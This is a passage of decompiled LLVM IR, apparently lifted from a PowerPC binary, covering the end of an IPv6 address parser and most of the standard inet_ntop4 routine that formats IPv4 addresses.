  store i32 %v1_1000eea43339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eea43339, i32* @r30, align 4
  %v3_1000eea83440 = icmp eq i32 %v1_1000eea43339, 0
  br i1 %v3_1000eea83440, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000edd8.lr.ph

dec_label_pc_1000edd8:                            ; preds = %dec_label_pc_1000edd8.lr.ph, %dec_label_pc_1000eea0.backedge
  %v1_1000eea435 = phi i32 [ %v1_1000eea43341, %dec_label_pc_1000edd8.lr.ph ], [ %v1_1000eea4, %dec_label_pc_1000eea0.backedge ]
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10013918.682 to i32), i32* @r25, align 4
  %v0_1000ede4 = load i32, i32* @r29, align 4
  %v1_1000ede4 = add i32 %v0_1000ede4, 1
  store i32 %v1_1000ede4, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10013918.682 to i32), i32* @r3, align 4
  store i32 268496368, i32* @lr, align 4
  %v3_1000edec = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_10013918.682 to i32), i32 %v1_1000eea435)
  store i32 %v3_1000edec, i32* %r3.global-to-local, align 4
  %v3_1000edf0 = icmp eq i32 %v3_1000edec, 0
  br i1 %v3_1000edf0, label %dec_label_pc_1000ee10, label %dec_label_pc_1000edf8

dec_label_pc_1000edf8:                            ; preds = %dec_label_pc_1000edd8
  %v0_1000edf8 = load i32, i32* @r25, align 4
  %v2_1000edf8 = sub i32 %v3_1000edec, %v0_1000edf8
  store i32 %v2_1000edf8, i32* %r0.global-to-local, align 4
  %v0_1000edfc = load i32, i32* @r28, align 4
  %v1_1000edfc = mul i32 %v0_1000edfc, 16
  store i32 %v1_1000edfc, i32* %r9.global-to-local, align 4
  %v2_1000ee00 = or i32 %v1_1000edfc, %v2_1000edf8
  store i32 %v2_1000ee00, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000ee00, 65536
  br i1 %tmp19, label %dec_label_pc_1000ee9c, label %dec_label_pc_1000ef4c

dec_label_pc_1000ee10:                            ; preds = %dec_label_pc_1000edd8
  %v0_1000ee10 = load i32, i32* @r30, align 4
  %v3_1000ee10 = icmp eq i32 %v0_1000ee10, 58
  br i1 %v3_1000ee10, label %dec_label_pc_1000ee18, label %dec_label_pc_1000ee6c

dec_label_pc_1000ee18:                            ; preds = %dec_label_pc_1000ee10
  %v0_1000ee18 = load i32, i32* @r23, align 4
  %v3_1000ee18 = icmp eq i32 %v0_1000ee18, 0
  br i1 %v3_1000ee18, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ee34

dec_label_pc_1000ee20:                            ; preds = %dec_label_pc_1000ee18
  %v0_1000ee20 = load i32, i32* @r24, align 4
  %v3_1000ee20 = icmp eq i32 %v0_1000ee20, 0
  br i1 %v3_1000ee20, label %dec_label_pc_1000ee28, label %dec_label_pc_1000ef4c

dec_label_pc_1000ee28:                            ; preds = %dec_label_pc_1000ee20
  %v0_1000ee28 = load i32, i32* @r31, align 4
  store i32 %v0_1000ee28, i32* @r24, align 4
  %v0_1000ee2c = load i32, i32* @r29, align 4
  store i32 %v0_1000ee2c, i32* @r26, align 4
  br label %dec_label_pc_1000eea0.backedge

dec_label_pc_1000ee34:                            ; preds = %dec_label_pc_1000ee18
  %v0_1000ee34 = load i32, i32* @r29, align 4
  %v1_1000ee34 = inttoptr i32 %v0_1000ee34 to i8*
  %v2_1000ee34 = load i8, i8* %v1_1000ee34, align 1
  %v3_1000ee34 = zext i8 %v2_1000ee34 to i32
  store i32 %v3_1000ee34, i32* %r0.global-to-local, align 4
  %v3_1000ee38 = icmp eq i8 %v2_1000ee34, 0
  br i1 %v3_1000ee38, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000ee40

dec_label_pc_1000ee40:                            ; preds = %dec_label_pc_1000ee34
  %v0_1000ee40 = load i32, i32* @r31, align 4
  %v1_1000ee40 = add i32 %v0_1000ee40, 2
  store i32 %v1_1000ee40, i32* %r0.global-to-local, align 4
  %v1_1000ee44 = load i32, i32* @r27, align 4
  %v3_1000ee44 = icmp ugt i32 %v1_1000ee40, %v1_1000ee44
  br i1 %v3_1000ee44, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000ee4c

dec_label_pc_1000ee4c:                            ; preds = %dec_label_pc_1000ee40
  %v0_1000ee4c = load i32, i32* @r28, align 4
  %v1_1000ee4c = udiv i32 %v0_1000ee4c, 256
  store i32 %v1_1000ee4c, i32* %r0.global-to-local, align 4
  %v1_1000ee50 = trunc i32 %v0_1000ee4c to i8
  %v3_1000ee50 = add i32 %v0_1000ee40, 1
  %v4_1000ee50 = inttoptr i32 %v3_1000ee50 to i8*
  store i8 %v1_1000ee50, i8* %v4_1000ee50, align 1
  %v0_1000ee54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee54 = trunc i32 %v0_1000ee54 to i8
  %v2_1000ee54 = load i32, i32* @r31, align 4
  %v3_1000ee54 = inttoptr i32 %v2_1000ee54 to i8*
  store i8 %v1_1000ee54, i8* %v3_1000ee54, align 1
  %v0_1000ee58 = load i32, i32* @r29, align 4
  store i32 %v0_1000ee58, i32* @r26, align 4
  %v0_1000ee5c = load i32, i32* @r31, align 4
  %v1_1000ee5c = add i32 %v0_1000ee5c, 2
  store i32 %v1_1000ee5c, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000eea030 = inttoptr i32 %v0_1000ee58 to i8*
  %v2_1000eea031 = load i8, i8* %v1_1000eea030, align 1
  %v3_1000eea032 = zext i8 %v2_1000eea031 to i32
  store i32 %v3_1000eea032, i32* %r3.global-to-local, align 4
  store i32 268496552, i32* @lr, align 4
  %v1_1000eea433 = call i32 @__GI_tolower(i32 %v3_1000eea032)
  store i32 %v1_1000eea433, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eea433, i32* @r30, align 4
  %v3_1000eea834 = icmp eq i32 %v1_1000eea433, 0
  br i1 %v3_1000eea834, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000edd8.lr.ph

dec_label_pc_1000edd8.lr.ph:                      ; preds = %dec_label_pc_1000edcc, %dec_label_pc_1000ee4c
  %v1_1000eea43341 = phi i32 [ %v1_1000eea433, %dec_label_pc_1000ee4c ], [ %v1_1000eea43339, %dec_label_pc_1000edcc ]
  br label %dec_label_pc_1000edd8

dec_label_pc_1000ee6c:                            ; preds = %dec_label_pc_1000ee10
  %v3_1000ee6c = icmp eq i32 %v0_1000ee10, 46
  br i1 %v3_1000ee6c, label %dec_label_pc_1000ee74, label %dec_label_pc_1000ef4c

dec_label_pc_1000ee74:                            ; preds = %dec_label_pc_1000ee6c
  %v0_1000ee74 = load i32, i32* @r31, align 4
  %v1_1000ee74 = add i32 %v0_1000ee74, 4
  store i32 %v1_1000ee74, i32* @r30, align 4
  %v1_1000ee78 = load i32, i32* @r27, align 4
  %v3_1000ee78 = icmp ugt i32 %v1_1000ee74, %v1_1000ee78
  br i1 %v3_1000ee78, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000ee80

dec_label_pc_1000ee80:                            ; preds = %dec_label_pc_1000ee74
  %v0_1000ee84 = load i32, i32* @r26, align 4
  store i32 %v0_1000ee84, i32* %r3.global-to-local, align 4
  store i32 268496524, i32* @lr, align 4
  %v3_1000ee88 = call i32 @inet_pton4(i32 %v0_1000ee84, i32 %v0_1000ee74)
  store i32 %v3_1000ee88, i32* %r3.global-to-local, align 4
  %v0_1000ee8c = load i32, i32* @r30, align 4
  store i32 %v0_1000ee8c, i32* @r31, align 4
  %v2_1000ee90 = icmp sgt i32 %v3_1000ee88, 0
  br i1 %v2_1000ee90, label %dec_label_pc_1000eed4, label %dec_label_pc_1000ef4c

dec_label_pc_1000ee9c:                            ; preds = %dec_label_pc_1000edf8
  store i32 1, i32* @r23, align 4
  %v0_1000eea0.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000eea0.backedge

dec_label_pc_1000eea0.backedge:                   ; preds = %dec_label_pc_1000ee9c, %dec_label_pc_1000ee28
  %v0_1000eea0.be = phi i32 [ %v0_1000eea0.pre.pre, %dec_label_pc_1000ee9c ], [ %v0_1000ee2c, %dec_label_pc_1000ee28 ]
  %v1_1000eea0 = inttoptr i32 %v0_1000eea0.be to i8*
  %v2_1000eea0 = load i8, i8* %v1_1000eea0, align 1
  %v3_1000eea0 = zext i8 %v2_1000eea0 to i32
  store i32 %v3_1000eea0, i32* %r3.global-to-local, align 4
  store i32 268496552, i32* @lr, align 4
  %v1_1000eea4 = call i32 @__GI_tolower(i32 %v3_1000eea0)
  store i32 %v1_1000eea4, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eea4, i32* @r30, align 4
  %v3_1000eea8 = icmp eq i32 %v1_1000eea4, 0
  br i1 %v3_1000eea8, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000edd8

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000eea0.backedge, %dec_label_pc_1000edcc, %dec_label_pc_1000ee4c
  %v0_1000eeb0 = load i32, i32* @r23, align 4
  %v3_1000eeb0 = icmp eq i32 %v0_1000eeb0, 0
  %v0_1000ef18.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000eeb0, label %dec_label_pc_1000eed4, label %dec_label_pc_1000eeb8

dec_label_pc_1000eeb8:                            ; preds = %dec_label_pc_1000eeb0
  %v1_1000eeb8 = add i32 %v0_1000ef18.pre.pre, 2
  store i32 %v1_1000eeb8, i32* %r0.global-to-local, align 4
  %v1_1000eebc = load i32, i32* @r27, align 4
  %v3_1000eebc = icmp ugt i32 %v1_1000eeb8, %v1_1000eebc
  br i1 %v3_1000eebc, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000eec4

dec_label_pc_1000eec4:                            ; preds = %dec_label_pc_1000eeb8
  %v0_1000eec4 = load i32, i32* @r28, align 4
  %v1_1000eec4 = udiv i32 %v0_1000eec4, 256
  store i32 %v1_1000eec4, i32* %r0.global-to-local, align 4
  %v1_1000eec8 = trunc i32 %v0_1000eec4 to i8
  %v3_1000eec8 = add i32 %v0_1000ef18.pre.pre, 1
  %v4_1000eec8 = inttoptr i32 %v3_1000eec8 to i8*
  store i8 %v1_1000eec8, i8* %v4_1000eec8, align 1
  %v0_1000eecc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000eecc = trunc i32 %v0_1000eecc to i8
  %v2_1000eecc = load i32, i32* @r31, align 4
  %v3_1000eecc = inttoptr i32 %v2_1000eecc to i8*
  store i8 %v1_1000eecc, i8* %v3_1000eecc, align 1
  %v0_1000eed0 = load i32, i32* @r31, align 4
  %v1_1000eed0 = add i32 %v0_1000eed0, 2
  store i32 %v1_1000eed0, i32* @r31, align 4
  br label %dec_label_pc_1000eed4

dec_label_pc_1000eed4:                            ; preds = %dec_label_pc_1000eeb0, %dec_label_pc_1000ee80, %dec_label_pc_1000eec4
  %v0_1000ef18.pre = phi i32 [ %v0_1000ee8c, %dec_label_pc_1000ee80 ], [ %v1_1000eed0, %dec_label_pc_1000eec4 ], [ %v0_1000ef18.pre.pre, %dec_label_pc_1000eeb0 ]
  %v0_1000eed4 = load i32, i32* @r24, align 4
  %v3_1000eed4 = icmp eq i32 %v0_1000eed4, 0
  %v1_1000ef18.pre = load i32, i32* @r27, align 4
  %v4_1000ef18 = icmp eq i32 %v0_1000ef18.pre, %v1_1000ef18.pre
  br i1 %v3_1000eed4, label %dec_label_pc_1000ef18, label %dec_label_pc_1000eedc

dec_label_pc_1000eedc:                            ; preds = %dec_label_pc_1000eed4
  %v2_1000eee0 = sub i32 %v0_1000ef18.pre, %v0_1000eed4
  store i32 %v2_1000eee0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000ef18, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000ef00.preheader

dec_label_pc_1000ef00.preheader:                  ; preds = %dec_label_pc_1000eedc
  %v3_1000ef0024 = icmp slt i32 %v2_1000eee0, 1
  %v2_1000ef0426 = add i32 %v2_1000eee0, -1
  store i32 %v2_1000ef0426, i32* %r10.global-to-local, align 4
  %v2_1000ef0827 = add i32 %v1_1000ef18.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000ef0024, label %dec_label_pc_1000ef18.thread, label %dec_label_pc_1000eef4

dec_label_pc_1000eef4:                            ; preds = %dec_label_pc_1000ef00.preheader, %dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge
  %v0_1000eef4 = phi i32 [ %v0_1000eef4.pre, %dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge ], [ %v0_1000eed4, %dec_label_pc_1000ef00.preheader ]
  %v2_1000ef0829 = phi i32 [ %v2_1000ef08, %dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge ], [ %v2_1000ef0827, %dec_label_pc_1000ef00.preheader ]
  %v2_1000ef0428 = phi i32 [ %v2_1000ef04, %dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge ], [ %v2_1000ef0426, %dec_label_pc_1000ef00.preheader ]
  %v2_1000eef4 = add i32 %v0_1000eef4, %v2_1000ef0428
  %v3_1000eef4 = inttoptr i32 %v2_1000eef4 to i8*
  %v4_1000eef4 = load i8, i8* %v3_1000eef4, align 1
  %v5_1000eef4 = zext i8 %v4_1000eef4 to i32
  store i32 %v5_1000eef4, i32* %r0.global-to-local, align 4
  %v3_1000eef8 = inttoptr i32 %v2_1000ef0829 to i8*
  store i8 %v4_1000eef4, i8* %v3_1000eef8, align 1
  %v0_1000eefc = load i32, i32* %r8.global-to-local, align 4
  %v1_1000eefc = load i32, i32* @r24, align 4
  %v2_1000eefc = load i32, i32* %r10.global-to-local, align 4
  %v3_1000eefc = trunc i32 %v0_1000eefc to i8
  %v4_1000eefc = add i32 %v2_1000eefc, %v1_1000eefc
  %v5_1000eefc = inttoptr i32 %v4_1000eefc to i8*
  store i8 %v3_1000eefc, i8* %v5_1000eefc, align 1
  %v0_1000ef00.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ef00.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ef08.pre = load i32, i32* @r27, align 4
  %v3_1000ef00 = icmp slt i32 %v1_1000ef00.pre, %v0_1000ef00.pre
  %v2_1000ef04 = sub i32 %v1_1000ef00.pre, %v0_1000ef00.pre
  store i32 %v2_1000ef04, i32* %r10.global-to-local, align 4
  %v1_1000ef0c = add i32 %v0_1000ef00.pre, 1
  store i32 %v1_1000ef0c, i32* %r9.global-to-local, align 4
  br i1 %v3_1000ef00, label %dec_label_pc_1000ef18.thread, label %dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge

dec_label_pc_1000eef4.dec_label_pc_1000eef4_crit_edge: ; preds = %dec_label_pc_1000eef4
  %v2_1000ef08 = sub i32 %v1_1000ef08.pre, %v0_1000ef00.pre
  %v0_1000eef4.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000eef4

dec_label_pc_1000ef18.thread:                     ; preds = %dec_label_pc_1000eef4, %dec_label_pc_1000ef00.preheader
  %v0_1000ef14.lcssa = phi i32 [ %v1_1000ef18.pre, %dec_label_pc_1000ef00.preheader ], [ %v1_1000ef08.pre, %dec_label_pc_1000eef4 ]
  store i32 %v0_1000ef14.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000ef20

dec_label_pc_1000ef18:                            ; preds = %dec_label_pc_1000eed4
  br i1 %v4_1000ef18, label %dec_label_pc_1000ef20, label %dec_label_pc_1000ef4c

dec_label_pc_1000ef20:                            ; preds = %dec_label_pc_1000ef18.thread, %dec_label_pc_1000ef18
  %v0_1000ef20 = load i32, i32* @r22, align 4
  store i32 %v0_1000ef20, i32* @r3, align 4
  store i32 %v2_1000ed9c, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ef30.683 to i32), i32* @lr, align 4
  %v0_1000ef2c = call i32 @memcpy()
  store i32 %v0_1000ef2c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000ef38:                            ; preds = %dec_label_pc_1000ed7c
  %v0_1000ef38 = call i32 @__errno_location()
  store i32 %v0_1000ef38, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ef44 = inttoptr i32 %v0_1000ef38 to i32*
  store i32 97, i32* %v2_1000ef44, align 4
  %v0_1000ef54.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000ef4c:                            ; preds = %dec_label_pc_1000ee40, %dec_label_pc_1000ee34, %dec_label_pc_1000edf8, %dec_label_pc_1000ee20, %dec_label_pc_1000eedc, %dec_label_pc_1000ee80, %dec_label_pc_1000ee6c, %dec_label_pc_1000ef18, %dec_label_pc_1000edc0, %dec_label_pc_1000eeb8, %dec_label_pc_1000ee74
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef50

dec_label_pc_1000ef50:                            ; preds = %dec_label_pc_1000ef38, %dec_label_pc_1000ef20, %dec_label_pc_1000ed88, %dec_label_pc_1000ef4c
  %v0_1000ef54 = phi i32 [ %v0_1000ef54.pre, %dec_label_pc_1000ef38 ], [ 1, %dec_label_pc_1000ef20 ], [ %v3_1000ed90, %dec_label_pc_1000ed88 ], [ 0, %dec_label_pc_1000ef4c ]
  store i32 %v0_1000ed60, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ef54, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ef54

; uselistorder directives
  uselistorder i32 %v0_1000ef54, { 1, 0 }
  uselistorder i32 %v2_1000ef04, { 1, 0 }
  uselistorder i32 %v0_1000ef00.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000ef18, { 1, 0 }
  uselistorder i32 %v0_1000ef18.pre, { 1, 0 }
  uselistorder i32 %v0_1000eec4, { 1, 0 }
  uselistorder i32 %v0_1000ef18.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000eea4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ee4c, { 1, 0 }
  uselistorder i32 %v1_1000edfc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 9, 10, 11, 12, 13, 6, 16, 14, 15, 2, 1, 5, 4, 3, 7, 17, 8, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268496552, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef50, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ef4c, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000ef20, { 1, 0 }
  uselistorder label %dec_label_pc_1000eef4, { 1, 0 }
  uselistorder label %dec_label_pc_1000eed4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eeb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000edd8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000edd8, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000efc0.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000ef68 = load i32, i32* @lr, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000ef94 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000ef94, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000efa4.686 to i32), i32* @lr, align 4
  %v3_1000efa0 = call i32 @__GI_memset(i32 %v2_1000ef94, i32 0, i32 15)
  store i32 %v3_1000efa0, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000f0642 = load i32, i32* @r1, align 4
  store i32 %v0_1000f0642, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000efc0

dec_label_pc_1000efc0:                            ; preds = %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge, %dec_label_pc_1000efc0.lr.ph
  %v2_1000efe0 = phi i32 [ %v2_1000f064, %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge ], [ %v0_1000f0642, %dec_label_pc_1000efc0.lr.ph ]
  %v0_1000efd4 = phi i32 [ %v0_1000f064, %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge ], [ %v0_1000f0642, %dec_label_pc_1000efc0.lr.ph ]
  %v0_1000efc4 = phi i32 [ %v1_1000f064, %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge ], [ 0, %dec_label_pc_1000efc0.lr.ph ]
  %v1_1000efcc = phi i32 [ %v1_1000efc0.pre, %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge ], [ 0, %dec_label_pc_1000efc0.lr.ph ]
  %v0_1000efc0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000efc0 = add i32 %v0_1000efc0, %v1_1000efcc
  %v3_1000efc0 = inttoptr i32 %v2_1000efc0 to i8*
  %v4_1000efc0 = load i8, i8* %v3_1000efc0, align 1
  %v5_1000efc0 = zext i8 %v4_1000efc0 to i32
  store i32 %v5_1000efc0, i32* %r10.global-to-local, align 4
  store i32 %v0_1000efc4, i32* %r8.global-to-local, align 4
  %v1_1000efc8 = add i32 %v0_1000efc4, 1
  store i32 %v1_1000efc8, i32* %r11.global-to-local, align 4
  store i32 %v2_1000efc0, i32* %r3.global-to-local, align 4
  %v1_1000efd0 = load i32, i32* @r28, align 4
  %v2_1000efd0 = udiv i32 %v5_1000efc0, %v1_1000efd0
  %v2_1000efd4 = add i32 %v1_1000efc8, %v0_1000efd4
  store i32 %v2_1000efd4, i32* %r6.global-to-local, align 4
  %v1_1000efd8 = add nuw nsw i32 %v2_1000efd0, 48
  %v1_1000efdc = urem i32 %v1_1000efd8, 256
  store i32 %v1_1000efdc, i32* %r0.global-to-local, align 4
  %v1_1000efe0 = trunc i32 %v1_1000efd8 to i8
  %v3_1000efe0 = add i32 %v2_1000efe0, 8
  %v4_1000efe0 = inttoptr i32 %v3_1000efe0 to i8*
  store i8 %v1_1000efe0, i8* %v4_1000efe0, align 1
  %v0_1000efe4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000efe4 = icmp eq i32 %v0_1000efe4, 48
  %v0_1000efec = load i32, i32* %r10.global-to-local, align 4
  %v1_1000efec = load i32, i32* %r5.global-to-local, align 4
  %v2_1000efec = udiv i32 %v0_1000efec, %v1_1000efec
  store i32 %v2_1000efec, i32* %r9.global-to-local, align 4
  br i1 %v3_1000efe4, label %dec_label_pc_1000efec, label %dec_label_pc_1000f018

dec_label_pc_1000efec:                            ; preds = %dec_label_pc_1000efc0
  %v2_1000eff0 = udiv i32 %v2_1000efec, %v1_1000efec
  %tmp18 = mul i32 %v2_1000eff0, -10
  %v2_1000eff8 = add i32 %v2_1000efec, 48
  %v1_1000effc = add i32 %v2_1000eff8, %tmp18
  store i32 %v1_1000effc, i32* %r9.global-to-local, align 4
  %v1_1000f000 = urem i32 %v1_1000effc, 256
  store i32 %v1_1000f000, i32* %r0.global-to-local, align 4
  %v1_1000f004 = trunc i32 %v1_1000effc to i8
  %v2_1000f004 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000f004 = add i32 %v2_1000f004, 8
  %v4_1000f004 = inttoptr i32 %v3_1000f004 to i8*
  store i8 %v1_1000f004, i8* %v4_1000f004, align 1
  %v0_1000f008 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000f008 = icmp eq i32 %v0_1000f008, 48
  br i1 %v3_1000f008, label %dec_label_pc_1000f034, label %dec_label_pc_1000f010

dec_label_pc_1000f010:                            ; preds = %dec_label_pc_1000efec
  %v0_1000f010 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000f010, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f034

dec_label_pc_1000f018:                            ; preds = %dec_label_pc_1000efc0
  %v0_1000f01c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f01c = add i32 %v0_1000f01c, 1
  store i32 %v1_1000f01c, i32* %r8.global-to-local, align 4
  %v2_1000f020 = udiv i32 %v2_1000efec, %v1_1000efec
  %v1_1000f024 = mul i32 %v2_1000f020, 10
  store i32 %v1_1000f024, i32* %r0.global-to-local, align 4
  %v2_1000f028 = sub i32 %v2_1000efec, %v1_1000f024
  %v1_1000f02c = add i32 %v2_1000f028, 48
  store i32 %v1_1000f02c, i32* %r9.global-to-local, align 4
  %v1_1000f030 = trunc i32 %v1_1000f02c to i8
  %v2_1000f030 = load i32, i32* %r6.global-to-local, align 4
  %v3_1000f030 = add i32 %v2_1000f030, 8
  %v4_1000f030 = inttoptr i32 %v3_1000f030 to i8*
  store i8 %v1_1000f030, i8* %v4_1000f030, align 1
  br label %dec_label_pc_1000f034

dec_label_pc_1000f034:                            ; preds = %dec_label_pc_1000efec, %dec_label_pc_1000f010, %dec_label_pc_1000f018
  %v0_1000f034 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f034 = inttoptr i32 %v0_1000f034 to i8*
  %v2_1000f034 = load i8, i8* %v1_1000f034, align 1
  %v3_1000f034 = zext i8 %v2_1000f034 to i32
  %v0_1000f038 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f038 = add i32 %v0_1000f038, 1
  %v0_1000f03c = load i32, i32* @r1, align 4
  %v2_1000f03c = add i32 %v0_1000f03c, %v0_1000f038
  store i32 %v2_1000f03c, i32* %r10.global-to-local, align 4
  %v2_1000f040 = add i32 %v1_1000f038, %v0_1000f03c
  store i32 %v2_1000f040, i32* %r8.global-to-local, align 4
  %v1_1000f044 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f044 = udiv i32 %v3_1000f034, %v1_1000f044
  %v1_1000f048 = add i32 %v0_1000f038, 2
  store i32 %v1_1000f048, i32* %r11.global-to-local, align 4
  %v0_1000f04c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f04c = add i32 %v0_1000f04c, 1
  store i32 %v1_1000f04c, i32* %r4.global-to-local, align 4
  %v1_1000f050 = mul nuw nsw i32 %v2_1000f044, 10
  store i32 %v1_1000f050, i32* %r0.global-to-local, align 4
  %v2_1000f054 = sub nsw i32 %v3_1000f034, %v1_1000f050
  %v1_1000f058 = add nsw i32 %v2_1000f054, 48
  store i32 %v1_1000f058, i32* %r9.global-to-local, align 4
  %v1_1000f05c = trunc i32 %v1_1000f058 to i8
  %v3_1000f05c = add i32 %v2_1000f03c, 8
  %v4_1000f05c = inttoptr i32 %v3_1000f05c to i8*
  store i8 %v1_1000f05c, i8* %v4_1000f05c, align 1
  %v0_1000f060 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000f060 = trunc i32 %v0_1000f060 to i8
  %v2_1000f060 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000f060 = add i32 %v2_1000f060, 8
  %v4_1000f060 = inttoptr i32 %v3_1000f060 to i8*
  store i8 %v1_1000f060, i8* %v4_1000f060, align 1
  %v0_1000f064 = load i32, i32* @r1, align 4
  %v1_1000f064 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000f064 = add i32 %v1_1000f064, %v0_1000f064
  store i32 %v2_1000f064, i32* %r7.global-to-local, align 4
  %v0_1000f068 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f068 = add i32 %v0_1000f068, -1
  store i32 %v1_1000f068, i32* %ctr.global-to-local, align 4
  %v2_1000f068 = icmp eq i32 %v1_1000f068, 0
  br i1 %v2_1000f068, label %dec_label_pc_1000f06c, label %dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge

dec_label_pc_1000f034.dec_label_pc_1000efc0_crit_edge: ; preds = %dec_label_pc_1000f034
